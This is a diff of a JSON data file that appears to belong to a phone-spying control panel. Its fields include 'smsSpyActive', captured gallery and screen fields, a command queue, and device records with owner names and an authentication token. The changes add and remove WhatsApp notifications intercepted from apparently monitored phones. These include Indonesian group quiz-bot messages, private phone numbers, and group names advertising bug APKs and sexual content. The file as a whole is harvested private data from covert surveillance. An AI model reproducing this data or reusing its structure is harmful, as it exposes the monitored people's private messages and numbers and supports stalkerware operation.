@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1230 pesan): ~ Bot",
+        "content": "⏰ Waktu habis! Jawaban yang benar adalah bayar asuransi",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081242986
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1700 pesan dari 14 chat",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081239507
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1229 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081239490
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1699 pesan dari 14 chat",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081237896
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1228 pesan): ~ 🧚‍♀️",
         "content": "Kapa bayar asuransi",
         "time": "02/04 06:07",
@@ -3987,38 +4019,6 @@
         "time": "02/04 02:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1775068301023
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "APK BUG BY ZYRXX: ~ sanzz",
-        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068300295
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
-        "content": "087898838081",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068300105
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (35 pesan): ~ Ubill",
-        "content": "Pm",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068298418
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
-        "content": "087898838081",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068297351
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1229 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081239474
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1700 pesan dari 14 chat",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081239458
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1699 pesan dari 14 chat",
+        "time": "02/04 06:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081237914
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1228 pesan): ~ 🧚‍♀️",
@@ -8040,30 +8064,6 @@
         "time": "02/04 02:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1775068300546
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
-        "content": "087898838081",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068300086
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "APK BUG BY ZYRXX: ~ sanzz",
-        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068297427
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
-        "content": "087898838081",
-        "time": "02/04 02:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775068297402
       }
     ],
     "galleryPhotos": [],
@@ -8483,7 +8483,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775081237333,
+    "lastSeen": 1775081240844,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
